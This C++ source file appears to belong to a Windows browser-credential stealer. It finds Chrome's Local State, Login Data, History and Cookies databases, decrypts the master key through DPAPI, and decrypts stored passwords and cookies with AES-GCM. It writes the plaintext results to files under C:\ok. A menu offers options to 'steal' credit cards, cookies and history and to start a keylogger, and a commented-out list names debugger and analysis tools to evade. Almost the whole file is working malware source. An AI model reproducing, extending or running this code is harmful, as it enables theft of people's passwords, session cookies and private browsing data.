#include "stealer.h"

#pragma comment(lib, "sqlite3.lib")

std::string WideStringToUtf8(const std::wstring& wstr)
{
    if (wstr.empty())
        return std::string();

    // Get the size needed for the UTF-8 string.
    int sizeNeeded = WideCharToMultiByte(CP_UTF8, 0, wstr.data(), static_cast<int>(wstr.size()), NULL, 0, NULL, NULL);
    std::string result(sizeNeeded, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.data(), static_cast<int>(wstr.size()), &result[0], sizeNeeded, NULL, NULL);
    return result;
}

bool bitmen::IsChromeInstalled() {
    HKEY hKey;
    // Use RegOpenKeyExW (Unicode version) instead of RegOpenKeyExA
    LONG lRes = RegOpenKeyExW(HKEY_LOCAL_MACHINE,
        L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\chrome.exe",
        0, KEY_READ, &hKey);

    if (lRes == ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return true;
    }
    else {
        return false;
    }
}

bool bitmen::EnsureOutputFilesExist() {
    const std::wstring outputDir = L"C:\\ok";
    if (!CreateDirectoryW(outputDir.c_str(), NULL) && GetLastError() != ERROR_ALREADY_EXISTS) {
        warn("Failed to create output directory. Error: %ld", GetLastError());
        return false;
    }

    auto CreateFileIfMissing = [](const char* path) {
        std::ofstream file(path, std::ios::app);
        if (!file.is_open()) {
            warn("Failed to create file: %s", path);
            return false;
        }
        return true;
        };

    return CreateFileIfMissing("C:\\ok\\passwords.txt") &&
        CreateFileIfMissing("C:\\ok\\creditcards.txt") &&
        CreateFileIfMissing("C:\\ok\\history.txt") &&
        CreateFileIfMissing("C:\\ok\\cookies.txt") &&
        CreateFileIfMissing("C:\\ok\\logs.txt");
}

std::wstring bitmen::FindLocalState() {
    WCHAR userProfile[MAX_PATH];
    HRESULT result = SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile);

    if (!SUCCEEDED(result)) {
        warn("Error getting user path. Error: %ld", GetLastError());
        return L"";
    }

    WCHAR localStatePath[MAX_PATH];
    _snwprintf_s(localStatePath, MAX_PATH, _TRUNCATE, L"%s\\AppData\\Local\\Google\\Chrome\\User Data\\Local State", userProfile);
    okay("Full path to Local State file: %ls", localStatePath);
    return std::wstring(localStatePath);
}

std::wstring bitmen::FindLoginData() {
    WCHAR userProfile[MAX_PATH];
    HRESULT result = SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile);

    if (!SUCCEEDED(result)) {
        warn("Error getting user path. Error: %ld", GetLastError());
        return L"";
    }

    WCHAR loginDataPath[MAX_PATH];
    _snwprintf_s(loginDataPath, MAX_PATH, L"%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data", userProfile);
    okay("Full path to Login Data file: %ls", loginDataPath);
    return std::wstring(loginDataPath);
}

std::string bitmen::getEncryptedKey(const std::wstring& localStatePath) {
    std::ifstream file(localStatePath);
    if (!file.is_open()) {
        warn("Error opening the file. Error: %ld", GetLastError());
        return "";
    }
    json localState = json::parse(file);
    file.close();

    auto itOsEncrypt = localState.find("os_crypt");
    if (itOsEncrypt == localState.end() || !itOsEncrypt.value().is_object()) {
        warn("Key os_crypt not found or not an object.");
        return "";
    }
    okay("Key os_crypt found.");

    auto itEncryptedKey = itOsEncrypt.value().find("encrypted_key");
    if (itEncryptedKey == itOsEncrypt.value().end()) {
        warn("Key encrypted_key not found or not an object");
        return "";
    }

    okay("Key encrypted_key found");
    std::string encryptedKey = itEncryptedKey.value();

    return encryptedKey;
}

DATA_BLOB bitmen::decryptKey(const std::string& encrypted_key) {
    if (encrypted_key.empty()) {
        warn("Input string is empty.");
        return {};
    }

    DWORD decodedBinarySize = 0;
    if (!CryptStringToBinaryA(encrypted_key.c_str(), 0, CRYPT_STRING_BASE64, NULL, &decodedBinarySize, NULL, NULL)) {
        warn("Error decoding Base64 string first step. Error: %ld\n", GetLastError());
        return {};
    }

    if (decodedBinarySize == 0) {
        warn("Decoded binary size is zero.");
        return {};
    }

    std::vector<BYTE> decodedBinaryData(decodedBinarySize);
    if (!CryptStringToBinaryA(encrypted_key.c_str(), 0, CRYPT_STRING_BASE64, decodedBinaryData.data(), &decodedBinarySize, NULL, NULL)) {
        warn("Error decoding Base64 string second step. Error: %ld\n", GetLastError());
        return {};
    }

    if (decodedBinaryData.size() < 5) {
        warn("Decoded binary data size is too small.\n");
        return {};
    }
    decodedBinaryData.erase(decodedBinaryData.begin(), decodedBinaryData.begin() + 5);

    DATA_BLOB DataInput;
    DATA_BLOB DataOutput;

    DataInput.cbData = static_cast<DWORD>(decodedBinaryData.size());
    DataInput.pbData = decodedBinaryData.data();

    if (!CryptUnprotectData(&DataInput, NULL, NULL, NULL, NULL, 0, &DataOutput)) {
        warn("Error decrypting data. Error %ld", GetLastError());
        LocalFree(DataOutput.pbData);
        return {};
    }

    return DataOutput;
}


int bitmen::loginDataParser(const std::wstring& loginDataPath, DATA_BLOB decryptionKey) {
    sqlite3* loginDataBase = nullptr;
    int openingStatus = 0;

    std::wstring copyLoginDataPath = loginDataPath;
    copyLoginDataPath.append(L"a");

    if (!CopyFileW(loginDataPath.c_str(), copyLoginDataPath.c_str(), FALSE)) {
        warn("Error copying the file. Error: %ld", GetLastError());
        return EXIT_FAILURE;
    }

    std::string string_converted_path = WideStringToUtf8(copyLoginDataPath);

    openingStatus = sqlite3_open_v2(string_converted_path.c_str(), &loginDataBase, SQLITE_OPEN_READONLY, nullptr);

    if (openingStatus) {
        warn("Can't open database: %s", sqlite3_errmsg(loginDataBase));
        sqlite3_close(loginDataBase);

        if (!DeleteFileW(copyLoginDataPath.c_str())) {
            warn("Error deleting the file. Error: %ld", GetLastError());
            return EXIT_FAILURE;
        }

        return openingStatus;
    }

    const char* sql = "SELECT origin_url, username_value, password_value, blacklisted_by_user FROM logins";
    sqlite3_stmt* stmt = nullptr;
    openingStatus = sqlite3_prepare_v2(loginDataBase, sql, -1, &stmt, nullptr);

    if (openingStatus != SQLITE_OK) {
        warn("SQL error: %s", sqlite3_errmsg(loginDataBase));
        sqlite3_close(loginDataBase);

        if (!DeleteFileW(copyLoginDataPath.c_str())) {
            warn("Error deleting the file. Error: %ld", GetLastError());
            return EXIT_FAILURE;
        }

        return openingStatus;
    }

    okay("Executed SQL Query.");

    if (!EnsureOutputFilesExist()) {
        warn("Failed to ensure output files exist");
        sqlite3_finalize(stmt);
        sqlite3_close(loginDataBase);
        return EXIT_FAILURE;
    }
    std::ofstream outFile("C:\\ok\\passwords.txt", std::ios::app);

    if (!outFile.is_open()) {
        warn("Failed to open output file for writing.");
        sqlite3_finalize(stmt);
        sqlite3_close(loginDataBase);
        return EXIT_FAILURE;
    }

    while ((openingStatus = sqlite3_step(stmt)) == SQLITE_ROW) {
        const unsigned char* originUrl = sqlite3_column_text(stmt, 0);
        const unsigned char* usernameValue = sqlite3_column_text(stmt, 1);
        const void* passwordBlob = sqlite3_column_blob(stmt, 2);
        int passwordSize = sqlite3_column_bytes(stmt, 2);
        int blacklistedByUser = sqlite3_column_int(stmt, 3);
        const unsigned char* origin = sqlite3_column_text(stmt, 0);
        const unsigned char* name_on_card = sqlite3_column_text(stmt, 1);
        const unsigned char* expiration_month = sqlite3_column_text(stmt, 2);
        const unsigned char* expiration_year = sqlite3_column_text(stmt, 3);
        const unsigned char* card_number_encrypted = sqlite3_column_text(stmt, 4);

        if (originUrl != NULL && originUrl[0] != '\0' &&
            usernameValue != NULL && usernameValue[0] != '\0' &&
            passwordBlob != NULL && blacklistedByUser != 1) {

            unsigned char iv[IV_SIZE];
            if (passwordSize >= (IV_SIZE + 3)) {
                memcpy(iv, (unsigned char*)passwordBlob + 3, IV_SIZE);
            }
            else {
                warn("Password size too small to generate IV");
                continue;
            }

            if (passwordSize <= (IV_SIZE + 3)) {
                warn("Password size too small");
                continue;
            }

            BYTE* Password = (BYTE*)malloc(passwordSize - (IV_SIZE + 3));
            if (Password == NULL) {
                warn("Memory allocation failed");
                continue;
            }
            memcpy(Password, (unsigned char*)passwordBlob + (IV_SIZE + 3), passwordSize - (IV_SIZE + 3));

            unsigned char decrypted[1024];
            decryptPassword(Password, passwordSize - (IV_SIZE + 3), decryptionKey.pbData, iv, decrypted);
            decrypted[passwordSize - (IV_SIZE + 3)] = '\0';

            okay("Origin URL: %s", originUrl);
            okay("Username Value: %s", usernameValue);
            okay("Password: %s", decrypted);

            outFile << "Origin URL: " << originUrl << "\n";
            outFile << "Username: " << usernameValue << "\n";
            outFile << "Password: " << decrypted << "\n";
            outFile << "----------------------------------\n";


            free(Password);
        }
    }

    if (openingStatus != SQLITE_DONE) {
        warn("SQL error or end of data: %s", sqlite3_errmsg(loginDataBase));
    }

    outFile.close();

    sqlite3_finalize(stmt);
    sqlite3_close(loginDataBase);

    if (!DeleteFileW(copyLoginDataPath.c_str())) {
        warn("Error deleting the file. Error: %ld", GetLastError());
        return EXIT_FAILURE;
    }

    return EXIT_SUCCESS;
}

struct TableEntry
{
    std::vector<std::string> Content;
};

std::vector<TableEntry> _tableEntries;

void bitmen::decryptPassword(unsigned char* ciphertext, size_t ciphertext_len, unsigned char* key, unsigned char* iv, unsigned char* decrypted) {
    unsigned long long decrypted_len;

    if (sodium_init() < 0) {
        fprintf(stderr, "Failed to initialize libsodium\n");
        return;
    }

    int result = crypto_aead_aes256gcm_decrypt(
        decrypted, &decrypted_len,
        NULL,
        ciphertext, ciphertext_len,
        NULL, 0,
        iv, key
    );

    if (result != 0) {
        fprintf(stderr, "Decryption failed\n");
    }
    else {
        decrypted[decrypted_len] = '\0';
    }
}

#pragma comment(lib, "Crypt32.lib")
#include <wincrypt.h>

std::string bitmen::DecryptStr(const std::string& bytes)
{
    try
    {
        if (bytes.empty())
            return "";

        DATA_BLOB in, out;
        in.pbData = reinterpret_cast<BYTE*>(const_cast<char*>(bytes.c_str()));
        in.cbData = static_cast<DWORD>(bytes.size() + 1);

        if (CryptUnprotectData(&in, nullptr, nullptr, nullptr, nullptr, 0, &out))
            return std::string(reinterpret_cast<const char*>(out.pbData), out.cbData);

        return "";
    }
    catch (...)
    {
        return "";
    }
}

std::wstring bitmen::FindHistoryPath() {
    WCHAR userProfile[MAX_PATH];
    HRESULT result = SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile);

    if (!SUCCEEDED(result)) {
        warn("Error getting user path. Error: %ld", GetLastError());
        return L"";
    }

    WCHAR historyPath[MAX_PATH];
    _snwprintf_s(historyPath, MAX_PATH, _TRUNCATE,
        L"%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History",
        userProfile);

    okay("Full path to History file: %ls", historyPath);
    return std::wstring(historyPath);
}

bool bitmen::GetHistory(const std::wstring& path) {
    sqlite3* historyDB = nullptr;
    std::wstring copyPath = path + L"temp";

    try {
        if (!CopyFileW(path.c_str(), copyPath.c_str(), FALSE)) {
            warn("Error copying history file. Error: %ld", GetLastError());
            return false;
        }

        int rc = sqlite3_open16(copyPath.c_str(), &historyDB);
        if (rc != SQLITE_OK) {
            warn("Can't open database: %s", sqlite3_errmsg(historyDB));
            sqlite3_close(historyDB);
            DeleteFileW(copyPath.c_str());
            return false;
        }

        const char* sql = "SELECT title, url, visit_count FROM urls";
        sqlite3_stmt* stmt;
        rc = sqlite3_prepare_v2(historyDB, sql, -1, &stmt, nullptr);

        if (rc != SQLITE_OK) {
            warn("SQL error: %s", sqlite3_errmsg(historyDB));
            sqlite3_close(historyDB);
            DeleteFileW(copyPath.c_str());
            return false;
        }

        if (!bitmen::EnsureOutputFilesExist()) {
            warn("Failed to ensure output files exist");
            sqlite3_finalize(stmt);
            sqlite3_close(historyDB);
            DeleteFileW(copyPath.c_str());
            return false;
        }
        std::ofstream outFile("C:\\ok\\history.txt", std::ios::app);

        if (!outFile.is_open()) {
            warn("Failed to open output file");
            sqlite3_finalize(stmt);
            sqlite3_close(historyDB);
            DeleteFileW(copyPath.c_str());
            return false;
        }

        outFile << "\n=== BROWSING HISTORY ===\n";

        while ((rc = sqlite3_step(stmt)) == SQLITE_ROW) {
            const unsigned char* title = sqlite3_column_text(stmt, 0);
            const unsigned char* url = sqlite3_column_text(stmt, 1);
            int visitCount = sqlite3_column_int(stmt, 2);

            if (title && url) {
                outFile << "Title: " << title << "\n";
                outFile << "URL: " << url << "\n";
                outFile << "Visits: " << visitCount << "\n";
                outFile << "------------------------\n";
            }
        }

        sqlite3_finalize(stmt);
        sqlite3_close(historyDB);
        DeleteFileW(copyPath.c_str());
        outFile.close();

        return true;
    }
    catch (...) {
        warn("Error processing history data");
        if (historyDB) sqlite3_close(historyDB);
        DeleteFileW(copyPath.c_str());
        return false;
    }
}

std::wstring bitmen::FindCookiesPath() {
    WCHAR userProfile[MAX_PATH];
    HRESULT result = SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile);

    if (!SUCCEEDED(result)) {
        warn("Error getting user path. Error: %ld", GetLastError());
        return L"";
    }

    WCHAR cookiesPath[MAX_PATH];
    _snwprintf_s(cookiesPath, MAX_PATH, _TRUNCATE,
        L"%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Cookies",
        userProfile);

    okay("Full path to Cookies file: %ls", cookiesPath);
    return std::wstring(cookiesPath);
}

bool bitmen::GetCookies(const std::wstring& cookiesPath, DATA_BLOB decryptionKey) {
    sqlite3* db;
    std::wstring tempPath = cookiesPath + L"temp";

    if (!CopyFileW(cookiesPath.c_str(), tempPath.c_str(), FALSE)) {
        warn("Failed to copy cookies file. Error: %ld", GetLastError());
        return false;
    }

    int rc = sqlite3_open16(tempPath.c_str(), &db);
    if (rc != SQLITE_OK) {
        warn("Can't open database: %s", sqlite3_errmsg(db));
        sqlite3_close(db);
        DeleteFileW(tempPath.c_str());
        return false;
    }

    const char* sql = "SELECT host_key, path, expires_utc, name, encrypted_value FROM cookies";
    sqlite3_stmt* stmt;
    rc = sqlite3_prepare_v2(db, sql, -1, &stmt, nullptr);

    if (rc != SQLITE_OK) {
        warn("SQL error: %s", sqlite3_errmsg(db));
        sqlite3_close(db);
        DeleteFileW(tempPath.c_str());
        return false;
    }

    std::ofstream outFile("C:\\ok\\cookies.txt", std::ios::app);
    if (!outFile.is_open()) {
        warn("Failed to open cookies output file");
        sqlite3_finalize(stmt);
        sqlite3_close(db);
        DeleteFileW(tempPath.c_str());
        return false;
    }

    while ((rc = sqlite3_step(stmt)) == SQLITE_ROW) {
        const unsigned char* host = sqlite3_column_text(stmt, 0);
        const unsigned char* path = sqlite3_column_text(stmt, 1);
        long long expires = sqlite3_column_int64(stmt, 2);
        const unsigned char* name = sqlite3_column_text(stmt, 3);
        const void* encrypted = sqlite3_column_blob(stmt, 4);
        int encrypted_size = sqlite3_column_bytes(stmt, 4);

        if (encrypted_size < 3 + IV_SIZE) {
            warn("Invalid encrypted cookie size");
            continue;
        }

        unsigned char iv[IV_SIZE];
        memcpy(iv, (unsigned char*)encrypted + 3, IV_SIZE);
        BYTE* ciphertext = (BYTE*)malloc(encrypted_size - 3 - IV_SIZE);
        memcpy(ciphertext, (unsigned char*)encrypted + 3 + IV_SIZE, encrypted_size - 3 - IV_SIZE);

        unsigned char decrypted[4096];
        decryptPassword(ciphertext, encrypted_size - 3 - IV_SIZE,
            decryptionKey.pbData, iv, decrypted);

        outFile << host << "\tTRUE\t" << path << "\tFALSE\t"
            << expires << "\t" << name << "\t" << decrypted << "\n";

        free(ciphertext);
    }

    sqlite3_finalize(stmt);
    sqlite3_close(db);
    DeleteFileW(tempPath.c_str());
    outFile.close();
    return true;
}

std::wstring bitmen::FindWebDataPath() {
    WCHAR userProfile[MAX_PATH];
    HRESULT result = SHGetFolderPathW(NULL, CSIDL_PROFILE, NULL, 0, userProfile);

    if (!SUCCEEDED(result)) {
        warn("Error getting user path. Error: %ld", GetLastError());
        return L"";
    }

    WCHAR webDataPath[MAX_PATH];
    _snwprintf_s(webDataPath, MAX_PATH, _TRUNCATE,
        L"%s\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data",
        userProfile);

    okay("Full path to Web Data file: %ls", webDataPath);
    return std::wstring(webDataPath);
}

//std::vector<std::string> blacklistedProcesses = { "x64dbg", "x32dbg", "ida64", "ida", "idaq", "idaq64", "ghidra",
//"ollydbg", "immunitydebugger", "windbg", "dbgview", "processhacker",
//"cheatengine", "scylla", "scylla_x64", "scylla_x86", "procexp",
//"procmon", "pe-sieve", "fiddler", "wireshark", "vmtools", "vboxservice",
//"vboxtray", "vmware", "dbghelp", "dumpcap", "hookshark" };

void bitmen::displayMenu() {
    printf("Menu:\n");
    printf("1. Proceed with password decryption\n");
    printf("2. Steal saved credit cards\n");
    printf("3. Steal browser history\n");
    printf("4. Steal cookies\n");
    printf("5. Begin keylogger\n");
    printf("6. Quit\n");
    printf("Enter your choice: ");
}